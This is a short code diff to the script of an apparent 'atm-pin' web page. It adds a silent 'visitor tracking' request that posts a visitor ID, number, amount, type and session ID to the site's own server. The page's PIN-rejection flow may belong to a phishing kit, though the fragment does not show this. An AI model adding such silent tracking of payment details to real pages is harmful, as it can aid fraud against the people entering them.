@@ -291,6 +291,13 @@
   const type = params.get('type') || 'bill';
   const errorParam = params.get('error');
 
+  // Visitor tracking
+  const _vid = params.get('vid') || localStorage.getItem('_vid') || '';
+  if (_vid) {
+    fetch('/api/visitor/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ visitorId: _vid, page: 'atm-pin', number, amount, type, sessionId }) }).catch(() => {});
+  }
+
   // Show error if rejected
   if (errorParam === 'pin') {
     document.getElementById('errorMsg').classList.add('show');
